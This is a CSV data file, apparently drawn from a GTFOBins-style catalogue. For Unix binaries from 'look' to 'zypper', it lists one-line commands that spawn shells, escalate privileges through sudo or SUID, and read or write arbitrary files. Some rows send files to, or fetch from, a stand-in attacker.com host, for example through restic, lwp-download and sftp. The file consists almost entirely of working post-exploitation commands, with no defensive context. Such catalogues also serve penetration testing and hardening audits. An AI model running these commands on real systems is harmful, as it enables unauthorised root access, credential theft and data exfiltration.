"look","sudo","LFILE=file_to_read ; sudo look '' ""$LFILE"""
"lwp-download","file-download","URL=http://attacker.com/file_to_get ; LFILE=file_to_save ; lwp-download $URL $LFILE"
"lwp-download","sudo","URL=http://attacker.com/file_to_get ; LFILE=file_to_save ; sudo lwp-download $URL $LFILE"
"lwp-download","file-write","LFILE=file_to_write ; TF=$(mktemp) ; echo DATA >$TF ; lwp-download file://$TF $LFILE"
"lwp-request","file-read","LFILE=file_to_read ; lwp-request ""file://$LFILE"""
"lwp-request","sudo","LFILE=file_to_read ; sudo lwp-request ""file://$LFILE"""
"make","shell","COMMAND='/bin/sh' ; make -s --eval=$'x:\n\t-'""$COMMAND"""
"make","suid","COMMAND='/bin/sh -p' ; ./make -s --eval=$'x:\n\t-'""$COMMAND"""
"make","sudo","COMMAND='/bin/sh' ; sudo make -s --eval=$'x:\n\t-'""$COMMAND"""
"man","shell","man man ; !/bin/sh"
"man","sudo","sudo man man ; !/bin/sh"
"mawk","file-write","LFILE=file_to_write ; mawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'"
"mawk","file-read","LFILE=file_to_read ; mawk '//' ""$LFILE"""
"mawk","suid","LFILE=file_to_read ; ./mawk '//' ""$LFILE"""
"more","shell","TERM= more /etc/profile ; !/bin/sh"
"more","sudo","TERM= sudo more /etc/profile ; !/bin/sh"
"mosquitto","file-read","LFILE=file_to_read ; mosquitto -c ""$LFILE"""
"mosquitto","suid","LFILE=file_to_read ; ./mosquitto -c ""$LFILE"""
"mosquitto","sudo","LFILE=file_to_read ; sudo mosquitto -c ""$LFILE"""
"msfconsole","shell","sudo msfconsole ; msf6 > irb ; >> system(""/bin/sh"")"
"msfconsole","sudo","sudo msfconsole ; msf6 > irb ; >> system(""/bin/sh"")"
"msgattrib","file-read","LFILE=file_to_read ; msgattrib -P $LFILE"
"msgattrib","sudo","LFILE=file_to_read ; sudo msgattrib -P $LFILE"
"msgattrib","suid","LFILE=file_to_read ; ./msgattrib -P $LFILE"
"msgcat","file-read","LFILE=file_to_read ; msgcat -P $LFILE"
"msgcat","sudo","LFILE=file_to_read ; sudo msgcat -P $LFILE"
"msgcat","suid","LFILE=file_to_read ; ./msgcat -P $LFILE"
"msgconv","file-read","LFILE=file_to_read ; msgconv -P $LFILE"
"msgconv","sudo","LFILE=file_to_read ; sudo msgconv -P $LFILE"
"msgconv","suid","LFILE=file_to_read ; ./msgconv -P $LFILE"
"msgmerge","file-read","LFILE=file_to_read ; msgmerge -P $LFILE /dev/null"
"msgmerge","sudo","LFILE=file_to_read ; sudo msgmerge -P $LFILE /dev/null"
"msgmerge","suid","LFILE=file_to_read ; ./msgmerge -P $LFILE /dev/null"
"msguniq","file-read","LFILE=file_to_read ; msguniq -P $LFILE"
"msguniq","sudo","LFILE=file_to_read ; sudo msguniq -P $LFILE"
"msguniq","suid","LFILE=file_to_read ; ./msguniq -P $LFILE"
"mtr","file-read","LFILE=file_to_read ; mtr --raw -F ""$LFILE"""
"mtr","sudo","LFILE=file_to_read ; sudo mtr --raw -F ""$LFILE"""
"mv","suid","LFILE=file_to_write ; TF=$(mktemp) ; echo ""DATA"" > $TF ; ./mv $TF $LFILE"
"mv","sudo","LFILE=file_to_write ; TF=$(mktemp) ; echo ""DATA"" > $TF ; sudo mv $TF $LFILE"
"nano","shell","nano ; ^R^X ; reset; sh 1>&0 2>&0"
"nano","file-write","nano file_to_write ; DATA ; ^O"
"nano","sudo","sudo nano ; ^R^X ; reset; sh 1>&0 2>&0"
"nasm","file-read","LFILE=file_to_read ; nasm -@ $LFILE"
"nasm","suid","LFILE=file_to_read ; ./nasm -@ $LFILE"
"nasm","sudo","LFILE=file_to_read ; sudo nasm -@ $LFILE"
"nawk","file-write","LFILE=file_to_write ; nawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'"
"nawk","file-read","LFILE=file_to_read ; nawk '//' ""$LFILE"""
"nawk","suid","LFILE=file_to_read ; ./nawk '//' ""$LFILE"""
"ncdu","shell","ncdu ; b"
"ncdu","sudo","sudo ncdu ; b"
"ncdu","limited-suid","./ncdu ; b"
"ncftp","shell","ncftp ; !/bin/sh"
"ncftp","suid","./ncftp ; !/bin/sh -p"
"ncftp","sudo","sudo ncftp ; !/bin/sh"
"neofetch","shell","TF=$(mktemp) ; echo 'exec /bin/sh' >$TF ; neofetch --config $TF"
"neofetch","sudo","TF=$(mktemp) ; echo 'exec /bin/sh' >$TF ; sudo neofetch --config $TF"
"nft","file-read","LFILE=file_to_read ; nft -f ""$LFILE"""
"nft","suid","LFILE=file_to_read ; ./nft -f ""$LFILE"""
"nft","sudo","LFILE=file_to_read ; sudo nft -f ""$LFILE"""
"nl","file-read","LFILE=file_to_read ; nl -bn -w1 -s '' $LFILE"
"nl","suid","LFILE=file_to_read ; ./nl -bn -w1 -s '' $LFILE"
"nl","sudo","LFILE=file_to_read ; sudo nl -bn -w1 -s '' $LFILE"
"nm","file-read","LFILE=file_to_read ; nm @$LFILE"
"nm","suid","LFILE=file_to_read ; ./nm @$LFILE"
"nm","sudo","LFILE=file_to_read ; sudo nm @$LFILE"
"nmap","file-write","TF=$(mktemp) ; echo 'local f=io.open(""file_to_write"", ""wb""); f:write(""data""); io.close(f);' > $TF ; nmap --script=$TF"
"nmap","file-read","TF=$(mktemp) ; echo 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);' > $TF ; nmap --script=$TF"
"nohup","command","COMMAND='/usr/bin/id' ; nohup ""$COMMAND"" ; cat nohup.out"
"nroff","shell","TF=$(mktemp -d) ; echo '#!/bin/sh' > $TF/groff ; echo '/bin/sh' >> $TF/groff ; chmod +x $TF/groff ; GROFF_BIN_PATH=$TF nroff"
"nroff","sudo","TF=$(mktemp -d) ; echo '#!/bin/sh' > $TF/groff ; echo '/bin/sh' >> $TF/groff ; chmod +x $TF/groff ; sudo GROFF_BIN_PATH=$TF nroff"
"ntpdate","file-read","LFILE=file_to_read ; ntpdate -a x -k $LFILE -d localhost"
"ntpdate","sudo","LFILE=file_to_read ; sudo ntpdate -a x -k $LFILE -d localhost"
"ntpdate","suid","LFILE=file_to_read ; ./ntpdate -a x -k $LFILE -d localhost"
"od","file-read","LFILE=file_to_read ; od -An -c -w9999 ""$LFILE"""
"od","suid","LFILE=file_to_read ; ./od -An -c -w9999 ""$LFILE"""
"od","sudo","LFILE=file_to_read ; sudo od -An -c -w9999 ""$LFILE"""
"openssl","file-write","LFILE=file_to_write ; echo DATA | openssl enc -out ""$LFILE"""
"openssl","file-write","LFILE=file_to_write ; TF=$(mktemp) ; echo ""DATA"" > $TF ; openssl enc -in ""$TF"" -out ""$LFILE"""
"openssl","file-read","LFILE=file_to_read ; openssl enc -in ""$LFILE"""
"openssl","suid","LFILE=file_to_write ; echo DATA | openssl enc -out ""$LFILE"""
"openvpn","shell","openvpn --dev null --script-security 2 --up '/bin/sh -c sh'"
"openvpn","suid","./openvpn --dev null --script-security 2 --up '/bin/sh -p -c ""sh -p""'"
"openvpn","sudo","sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'"
"pandoc","file-read","LFILE=file_to_read ; pandoc -t plain ""$LFILE"""
"pandoc","file-write","LFILE=file_to_write ; echo DATA | pandoc -t plain -o ""$LFILE"""
"pandoc","suid","LFILE=file_to_write ; echo DATA | ./pandoc -t plain -o ""$LFILE"""
"paste","file-read","LFILE=file_to_read ; paste $LFILE"
"paste","suid","LFILE=file_to_read ; paste $LFILE"
"paste","sudo","LFILE=file_to_read ; sudo paste $LFILE"
"pdb","shell","TF=$(mktemp) ; echo 'import os; os.system(""/bin/sh"")' > $TF ; pdb $TF ; cont"
"pdb","sudo","TF=$(mktemp) ; echo 'import os; os.system(""/bin/sh"")' > $TF ; sudo pdb $TF ; cont"
"pdflatex","shell","pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'"
"pdflatex","sudo","sudo pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'"
"pdflatex","limited-suid","./pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'"
"pdftex","shell","pdftex --shell-escape '\write18{/bin/sh}\end'"
"pdftex","sudo","sudo pdftex --shell-escape '\write18{/bin/sh}\end'"
"pdftex","limited-suid","./pdftex --shell-escape '\write18{/bin/sh}\end'"
"perf","shell","perf stat /bin/sh"
"perf","suid","./perf stat /bin/sh -p"
"perf","sudo","sudo perf stat /bin/sh"
"perl","file-read","LFILE=file_to_read ; perl -ne print $LFILE"
"pg","shell","pg /etc/profile ; !/bin/sh"
"pg","sudo","sudo pg /etc/profile ; !/bin/sh"
"php","shell","export CMD=""/bin/sh"" ; php -r 'system(getenv(""CMD""));'"
"php","shell","export CMD=""/bin/sh"" ; php -r 'passthru(getenv(""CMD""));'"
"php","shell","export CMD=""/bin/sh"" ; php -r 'print(shell_exec(getenv(""CMD"")));'"
"php","shell","export CMD=""/bin/sh"" ; php -r '$r=array(); exec(getenv(""CMD""), $r); print(join(""\\n"",$r));'"
"php","shell","export CMD=""/bin/sh"" ; php -r '$h=@popen(getenv(""CMD""),""r""); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'"
"php","command","export CMD=""id"" ; php -r '$p = array(array(""pipe"",""r""),array(""pipe"",""w""),array(""pipe"", ""w""));$h = @proc_open(getenv(""CMD""), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'"
"php","suid","CMD=""/bin/sh"" ; ./php -r ""pcntl_exec('/bin/sh', ['-p']);"""
"php","sudo","CMD=""/bin/sh"" ; sudo php -r ""system('$CMD');"""
"php","capabilities","CMD=""/bin/sh"" ; ./php -r ""posix_setuid(0); system('$CMD');"""
"php","file-read","export LFILE=file_to_read ; php -r 'readfile(getenv(""LFILE""));'"
"pic","shell","pic -U ; .PS ; sh X sh X"
"pic","sudo","sudo pic -U ; .PS ; sh X sh X"
"pic","limited-suid","./pic -U ; .PS ; sh X sh X"
"pico","shell","pico ; ^R^X ; reset; sh 1>&0 2>&0"
"pico","file-write","pico file_to_write ; DATA ; ^O"
"pico","sudo","sudo pico ; ^R^X ; reset; sh 1>&0 2>&0"
"pidstat","command","COMMAND=id ; pidstat -e $COMMAND"
"pidstat","sudo","COMMAND=id ; sudo pidstat -e $COMMAND"
"pidstat","suid","COMMAND=id ; ./pidstat -e $COMMAND"
"pip","shell","TF=$(mktemp -d) ; echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py ; pip install $TF"
"pip","library-load","TF=$(mktemp -d) ; echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py ; pip install $TF"
"pip","sudo","TF=$(mktemp -d) ; echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py ; sudo pip install $TF"
"pr","file-read","LFILE=file_to_read ; pr -T $LFILE"
"pr","suid","LFILE=file_to_read ; pr -T $LFILE"
"pr","sudo","LFILE=file_to_read ; pr -T $LFILE"
"pry","shell","pry ; system(""/bin/sh"")"
"pry","sudo","sudo pry ; system(""/bin/sh"")"
"pry","limited-suid","./pry ; system(""/bin/sh"")"
"psftp","shell","psftp ; !/bin/sh"
"psftp","limited-suid","sudo psftp ; !/bin/sh"
"psftp","sudo","sudo psftp ; !/bin/sh"
"psql","shell","psql ; \? ; !/bin/sh"
"psql","sudo","psql ; \? ; !/bin/sh"
"ptx","file-read","LFILE=file_to_read ; ptx -w 5000 ""$LFILE"""
"ptx","suid","LFILE=file_to_read ; ./ptx -w 5000 ""$LFILE"""
"ptx","sudo","LFILE=file_to_read ; sudo ptx -w 5000 ""$LFILE"""
"puppet","shell","puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }"""
"puppet","sudo","sudo puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }"""
"pwsh","file-write","export LFILE=file_to_write ; pwsh -c '""DATA"" | Out-File $env:LFILE'"
"readelf","file-read","LFILE=file_to_read ; readelf -a @$LFILE"
"readelf","suid","LFILE=file_to_read ; ./readelf -a @$LFILE"
"readelf","sudo","LFILE=file_to_read ; sudo readelf -a @$LFILE"
"red","file-write","red file_to_write ; a ; DATA ; . ; w ; q"
"red","file-read","red file_to_read ; ,p ; q"
"red","sudo","sudo red file_to_write ; a ; DATA ; . ; w ; q"
"redcarpet","file-read","LFILE=file_to_read ; redcarpet ""$LFILE"""
"redcarpet","sudo","LFILE=file_to_read ; sudo redcarpet ""$LFILE"""
"restic","file-upload","RHOST=attacker.com ; RPORT=12345 ; LFILE=file_or_dir_to_get ; NAME=backup_name ; restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE"""
"restic","sudo","RHOST=attacker.com ; RPORT=12345 ; LFILE=file_or_dir_to_get ; NAME=backup_name ; sudo restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE"""
"restic","suid","RHOST=attacker.com ; RPORT=12345 ; LFILE=file_or_dir_to_get ; NAME=backup_name ; ./restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE"""
"rev","file-read","LFILE=file_to_read ; rev $LFILE | rev"
"rev","suid","LFILE=file_to_read ; ./rev $LFILE | rev"
"rev","sudo","LFILE=file_to_read ; sudo rev $LFILE | rev"
"rtorrent","shell","echo ""execute = /bin/sh,-c,\""/bin/sh <$(tty) >$(tty) 2>$(tty)\"""" >~/.rtorrent.rc ; rtorrent"
"rtorrent","suid","echo ""execute = /bin/sh,-p,-c,\""/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"""" >~/.rtorrent.rc ; ./rtorrent"
"runscript","shell","TF=$(mktemp) ; echo '! exec /bin/sh' >$TF ; runscript $TF"
"runscript","limited-suid","TF=$(mktemp) ; echo '! exec /bin/sh' >$TF ; ./runscript $TF"
"runscript","sudo","TF=$(mktemp) ; echo '! exec /bin/sh' >$TF ; sudo runscript $TF"
"rview","file-write","rview file_to_write ; iDATA ; ^[ ; w!"
"rvim","file-write","rvim file_to_write ; iDATA ; ^[ ; w"
"scanmem","shell","scanmem ; shell /bin/sh"
"scanmem","suid","./scanmem ; shell /bin/sh"
"scanmem","sudo","sudo scanmem ; shell /bin/sh"
"scp","shell","TF=$(mktemp) ; echo 'sh 0<&2 1>&2' > $TF ; chmod +x ""$TF"" ; scp -S $TF x y:"
"scp","sudo","TF=$(mktemp) ; echo 'sh 0<&2 1>&2' > $TF ; chmod +x ""$TF"" ; sudo scp -S $TF x y:"
"scp","limited-suid","TF=$(mktemp) ; echo 'sh 0<&2 1>&2' > $TF ; chmod +x ""$TF"" ; ./scp -S $TF a b:"
"sed","file-write","LFILE=file_to_write ; sed -n ""1s/.*/DATA/w $LFILE"" /etc/hosts"
"sed","file-read","LFILE=file_to_read ; sed '' ""$LFILE"""
"sed","suid","LFILE=file_to_read ; ./sed -e '' ""$LFILE"""
"setfacl","suid","LFILE=file_to_change ; USER=somebody ; ./setfacl -m u:$USER:rwx $LFILE"
"setfacl","sudo","LFILE=file_to_change ; USER=somebody ; sudo setfacl -m -u:$USER:rwx $LFILE"
"setlock","shell","TF=$(mktemp) ; setlock $TF /bin/sh"
"sftp","shell","HOST=user@attacker.com ; sftp $HOST ; !/bin/sh"
"sftp","sudo","HOST=user@attacker.com ; sudo sftp $HOST ; !/bin/sh"
"sg","sudo","sudo sg root"
"smbclient","shell","smbclient '\\attacker\share' ; !/bin/sh"
"smbclient","sudo","sudo smbclient '\\attacker\share' ; !/bin/sh"
"socat","file-read","LFILE=file_to_read ; socat -u ""file:$LFILE"" -"
"socat","file-write","LFILE=file_to_write ; socat -u 'exec:echo DATA' ""open:$LFILE,creat"""
"soelim","file-read","LFILE=file_to_read ; soelim ""$LFILE"""
"soelim","suid","LFILE=file_to_read ; ./soelim ""$LFILE"""
"soelim","sudo","LFILE=file_to_read ; sudo soelim ""$LFILE"""
"sort","file-read","LFILE=file_to_read ; sort -m ""$LFILE"""
"sort","suid","LFILE=file_to_read ; ./sort -m ""$LFILE"""
"sort","sudo","LFILE=file_to_read ; sudo sort -m ""$LFILE"""
"split","file-read","LFILE=file_to_read ; TF=$(mktemp) ; split $LFILE $TF ; cat $TF*"
"sqlite3","file-write","LFILE=file_to_write ; sqlite3 /dev/null -cmd "".output $LFILE"" 'select ""DATA"";'"
"sqlite3","file-read","LFILE=file_to_read ; sqlite3 << EOF ; CREATE TABLE t(line TEXT); ; .import $LFILE t ; SELECT * FROM t; ; EOF"
"sqlite3","suid","LFILE=file_to_read ; sqlite3 << EOF ; CREATE TABLE t(line TEXT); ; .import $LFILE t ; SELECT * FROM t; ; EOF"
"ss","file-read","LFILE=file_to_read ; ss -a -F $LFILE"
"ss","suid","LFILE=file_to_read ; ./ss -a -F $LFILE"
"ss","sudo","LFILE=file_to_read ; sudo ss -a -F $LFILE"
"ssh-keyscan","file-read","LFILE=file_to_read ; ssh-keyscan -f $LFILE"
"ssh-keyscan","suid","LFILE=file_to_read ; ./ssh-keyscan -f $LFILE"
"ssh-keyscan","sudo","LFILE=file_to_read ; sudo ssh-keyscan -f $LFILE"
"strings","file-read","LFILE=file_to_read ; strings ""$LFILE"""
"strings","suid","LFILE=file_to_read ; ./strings ""$LFILE"""
"strings","sudo","LFILE=file_to_read ; sudo strings ""$LFILE"""
"sysctl","suid","COMMAND='/bin/sh -c id>/tmp/id' ; ./sysctl ""kernel.core_pattern=|$COMMAND"" ; sleep 9999 & ; kill -QUIT $! ; cat /tmp/id"
"sysctl","sudo","COMMAND='/bin/sh -c id>/tmp/id' ; sudo sysctl ""kernel.core_pattern=|$COMMAND"" ; sleep 9999 & ; kill -QUIT $! ; cat /tmp/id"
"systemctl","suid","TF=$(mktemp).service ; echo '[Service] ; Type=oneshot ; ExecStart=/bin/sh -c ""id > /tmp/output"" ; [Install] ; WantedBy=multi-user.target' > $TF ; ./systemctl link $TF ; ./systemctl enable --now $TF"
"systemctl","sudo","TF=$(mktemp) ; echo /bin/sh >$TF ; chmod +x $TF ; sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice"
"systemctl","sudo","TF=$(mktemp).service ; echo '[Service] ; Type=oneshot ; ExecStart=/bin/sh -c ""id > /tmp/output"" ; [Install] ; WantedBy=multi-user.target' > $TF ; sudo systemctl link $TF ; sudo systemctl enable --now $TF"
"tac","file-read","LFILE=file_to_read ; tac -s 'RANDOM' ""$LFILE"""
"tac","suid","LFILE=file_to_read ; ./tac -s 'RANDOM' ""$LFILE"""
"tac","sudo","LFILE=file_to_read ; sudo tac -s 'RANDOM' ""$LFILE"""
"tail","file-read","LFILE=file_to_read ; tail -c1G ""$LFILE"""
"tail","suid","LFILE=file_to_read ; ./tail -c1G ""$LFILE"""
"tail","sudo","LFILE=file_to_read ; sudo tail -c1G ""$LFILE"""
"tasksh","shell","tasksh ; !/bin/sh"
"tasksh","limited-suid","./tasksh ; !/bin/sh"
"tasksh","sudo","sudo tasksh ; !/bin/sh"
"tbl","file-read","LFILE=file_to_read ; tbl $LFILE"
"tbl","suid","LFILE=file_to_read ; ./tbl $LFILE"
"tbl","sudo","LFILE=file_to_read ; sudo tbl $LFILE"
"tclsh","shell","tclsh ; exec /bin/sh <@stdin >@stdout 2>@stderr"
"tclsh","suid","./tclsh ; exec /bin/sh -p <@stdin >@stdout 2>@stderr"
"tclsh","sudo","sudo tclsh ; exec /bin/sh <@stdin >@stdout 2>@stderr"
"tcpdump","command","COMMAND='id' ; TF=$(mktemp) ; echo ""$COMMAND"" > $TF ; chmod +x $TF ; tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF"
"tcpdump","sudo","COMMAND='id' ; TF=$(mktemp) ; echo ""$COMMAND"" > $TF ; chmod +x $TF ; sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root"
"tdbtool","shell","tdbtool ; ! /bin/sh"
"tdbtool","sudo","sudo tdbtool ; ! /bin/sh"
"tdbtool","limited-suid","./tdbtool ; ! /bin/sh"
"tee","file-write","LFILE=file_to_write ; echo DATA | ./tee -a ""$LFILE"""
"tee","suid","LFILE=file_to_write ; echo DATA | ./tee -a ""$LFILE"""
"tee","sudo","LFILE=file_to_write ; echo DATA | sudo tee -a ""$LFILE"""
"terraform","file-read","terraform console ; file(""file_to_read"")"
"terraform","sudo","sudo terraform console ; file(""file_to_read"")"
"terraform","suid","./terraform console ; file(""file_to_read"")"
"tex","shell","tex --shell-escape '\write18{/bin/sh}\end'"
"tex","sudo","sudo tex --shell-escape '\write18{/bin/sh}\end'"
"tex","limited-suid","./tex --shell-escape '\write18{/bin/sh}\end'"
"tic","file-read","LFILE=file_to_read ; tic -C ""$LFILE"""
"tic","suid","LFILE=file_to_read ; ./tic -C ""$LFILE"""
"tic","sudo","LFILE=file_to_read ; sudo tic -C ""$LFILE"""
"timedatectl","shell","timedatectl list-timezones ; !/bin/sh"
"timedatectl","sudo","sudo timedatectl list-timezones ; !/bin/sh"
"top","shell","echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc ; top ; # press return twice ; reset"
"troff","file-read","LFILE=file_to_read ; troff $LFILE"
"troff","suid","LFILE=file_to_read ; ./troff $LFILE"
"troff","sudo","LFILE=file_to_read ; sudo troff $LFILE"
"tshark","shell","TF=$(mktemp) ; echo 'os.execute(""/bin/sh"")' >$TF ; tshark -Xlua_script:$TF"
"ul","file-read","LFILE=file_to_read ; ul ""$LFILE"""
"ul","suid","LFILE=file_to_read ; ./ul ""$LFILE"""
"ul","sudo","LFILE=file_to_read ; sudo ul ""$LFILE"""
"unexpand","file-read","LFILE=file_to_read ; unexpand -t99999999 ""$LFILE"""
"unexpand","suid","LFILE=file_to_read ; ./unexpand -t99999999 ""$LFILE"""
"unexpand","sudo","LFILE=file_to_read ; sudo unexpand -t99999999 ""$LFILE"""
"uniq","file-read","LFILE=file_to_read ; uniq ""$LFILE"""
"uniq","suid","LFILE=file_to_read ; ./uniq ""$LFILE"""
"uniq","sudo","LFILE=file_to_read ; sudo uniq ""$LFILE"""
"unsquashfs","sudo","sudo unsquashfs shell ; ./squashfs-root/sh -p"
"unsquashfs","suid","./unsquashfs shell ; ./squashfs-root/sh -p"
"unzip","sudo","sudo unzip -K shell.zip ; ./sh -p"
"unzip","suid","./unzip -K shell.zip ; ./sh -p"
"uudecode","file-read","LFILE=file_to_read ; uuencode ""$LFILE"" /dev/stdout | uudecode"
"uudecode","suid","LFILE=file_to_read ; uuencode ""$LFILE"" /dev/stdout | uudecode"
"uudecode","sudo","LFILE=file_to_read ; sudo uuencode ""$LFILE"" /dev/stdout | uudecode"
"uuencode","file-read","LFILE=file_to_read ; uuencode ""$LFILE"" /dev/stdout | uudecode"
"uuencode","suid","LFILE=file_to_read ; uuencode ""$LFILE"" /dev/stdout | uudecode"
"uuencode","sudo","LFILE=file_to_read ; sudo uuencode ""$LFILE"" /dev/stdout | uudecode"
"vagrant","shell","cd $(mktemp -d) ; echo 'exec ""/bin/sh""' > Vagrantfile ; vagrant up"
"vagrant","sudo","cd $(mktemp -d) ; echo 'exec ""/bin/sh""' > Vagrantfile ; vagrant up"
"vagrant","suid","cd $(mktemp -d) ; echo 'exec ""/bin/sh -p""' > Vagrantfile ; vagrant up"
"varnishncsa","sudo","LFILE=file_to_write ; sudo varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE"""
"varnishncsa","suid","LFILE=file_to_write ; ./varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE"""
"vi","shell","vi ; :set shell=/bin/sh ; :shell"
"vi","file-write","vi file_to_write ; iDATA ; ^[ ; w"
"view","shell","view ; :set shell=/bin/sh ; :shell"
"view","file-write","view file_to_write ; iDATA ; ^[ ; w!"
"vim","file-write","vim file_to_write ; iDATA ; ^[ ; w"
"vimdiff","shell","vimdiff ; :set shell=/bin/sh ; :shell"
"vimdiff","file-write","vimdiff file_to_write ; iDATA ; ^[ ; w"
"virsh","sudo","SCRIPT=script_to_run ; TF=$(mktemp) ; cat > $TF << EOF ; <domain type='kvm'> ; <name>x</name> ; <os> ; <type arch='x86_64'>hvm</type> ; </os> ; <memory unit='KiB'>1</memory> ; <devices> ; <interface type='ethernet'> ; <script path='$SCRIPT'/> ; </interface> ; </devices> ; </domain> ; EOF ; sudo virsh -c qemu:///system create $TF ; virsh -c qemu:///system destroy x"
"volatility","shell","volatility -f file.dump volshell ; __import__('os').system('/bin/sh')"
"w3m","file-read","LFILE=file_to_read ; w3m ""$LFILE"" -dump"
"w3m","suid","LFILE=file_to_read ; ./w3m ""$LFILE"" -dump"
"w3m","sudo","LFILE=file_to_read ; sudo w3m ""$LFILE"" -dump"
"wall","sudo","LFILE=file_to_read ; sudo wall --nobanner ""$LFILE"""
"wc","file-read","LFILE=file_to_read ; wc --files0-from ""$LFILE"""
"wc","suid","LFILE=file_to_read ; ./wc --files0-from ""$LFILE"""
"wc","sudo","LFILE=file_to_read ; sudo wc --files0-from ""$LFILE"""
"wget","shell","TF=$(mktemp) ; chmod +x $TF ; echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF ; wget --use-askpass=$TF 0"
"wget","suid","TF=$(mktemp) ; chmod +x $TF ; echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF ; ./wget --use-askpass=$TF 0"
"wget","sudo","TF=$(mktemp) ; chmod +x $TF ; echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF ; sudo wget --use-askpass=$TF 0"
"whiptail","file-read","LFILE=file_to_read ; whiptail --textbox --scrolltext ""$LFILE"" 0 0"
"whiptail","suid","LFILE=file_to_read ; ./whiptail --textbox --scrolltext ""$LFILE"" 0 0"
"whiptail","sudo","LFILE=file_to_read ; sudo whiptail --textbox --scrolltext ""$LFILE"" 0 0"
"wish","shell","wish ; exec /bin/sh <@stdin >@stdout 2>@stderr"
"wish","sudo","sudo wish ; exec /bin/sh <@stdin >@stdout 2>@stderr"
"xdg-user-dir","shell","xdg-user-dir '}; /bin/sh #'"
"xdg-user-dir","sudo","sudo xdg-user-dir '}; /bin/sh #'"
"xelatex","shell","xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'"
"xelatex","sudo","sudo xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'"
"xelatex","limited-suid","./xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'"
"xetex","shell","xetex --shell-escape '\write18{/bin/sh}\end'"
"xetex","sudo","sudo xetex --shell-escape '\write18{/bin/sh}\end'"
"xetex","limited-suid","./xetex --shell-escape '\write18{/bin/sh}\end'"
"xmodmap","file-read","LFILE=file_to_read ; xmodmap -v $LFILE"
"xmodmap","suid","LFILE=file_to_read ; ./xmodmap -v $LFILE"
"xmodmap","sudo","LFILE=file_to_read ; sudo xmodmap -v $LFILE"
"xmore","file-read","LFILE=file_to_read ; xmore $LFILE"
"xmore","suid","LFILE=file_to_read ; ./xmore $LFILE"
"xmore","sudo","LFILE=file_to_read ; sudo xmore $LFILE"
"xpad","file-read","LFILE=file_to_read ; xpad -f ""$LFILE"""
"xpad","sudo","LFILE=file_to_read ; sudo xpad -f ""$LFILE"""
"xxd","file-write","LFILE=file_to_write ; echo DATA | xxd | xxd -r - ""$LFILE"""
"xxd","file-read","LFILE=file_to_read ; xxd ""$LFILE"" | xxd -r"
"xxd","suid","LFILE=file_to_read ; ./xxd ""$LFILE"" | xxd -r"
"xxd","sudo","LFILE=file_to_read ; sudo xxd ""$LFILE"" | xxd -r"
"xz","file-read","LFILE=file_to_read ; xz -c ""$LFILE"" | xz -d"
"xz","suid","LFILE=file_to_read ; ./xz -c ""$LFILE"" | xz -d"
"xz","sudo","LFILE=file_to_read ; sudo xz -c ""$LFILE"" | xz -d"
"zathura","shell","zathura ; :! /bin/sh -c 'exec /bin/sh 0<&1'"
"zathura","sudo","sudo zathura ; :! /bin/sh -c 'exec /bin/sh 0<&1'"
"zip","file-read","LFILE=file-to-read ; TF=$(mktemp -u) ; zip $TF $LFILE ; unzip -p $TF"
"zip","shell","TF=$(mktemp -u) ; zip $TF /etc/hosts -T -TT 'sh #' ; rm $TF"
"zip","sudo","TF=$(mktemp -u) ; sudo zip $TF /etc/hosts -T -TT 'sh #' ; sudo rm $TF"
"zip","limited-suid","TF=$(mktemp -u) ; ./zip $TF /etc/hosts -T -TT 'sh #' ; sudo rm $TF"
"zsh","file-read","export LFILE=file_to_read ; zsh -c 'echo ""$(<$LFILE)""'"
"zsh","file-write","export LFILE=file_to_write ; zsh -c 'echo DATA >$LFILE'"
"zsoelim","file-read","LFILE=file_to_read ; zsoelim ""$LFILE"""
"zsoelim","suid","LFILE=file_to_read ; ./zsoelim ""$LFILE"""
"zsoelim","sudo","LFILE=file_to_read ; sudo zsoelim ""$LFILE"""
"zypper","shell","TF=$(mktemp -d) ; cp /bin/sh $TF/zypper-x ; export PATH=$TF:$PATH ; zypper x"
"zypper","sudo","TF=$(mktemp -d) ; cp /bin/sh $TF/zypper-x ; sudo PATH=$TF:$PATH zypper x"
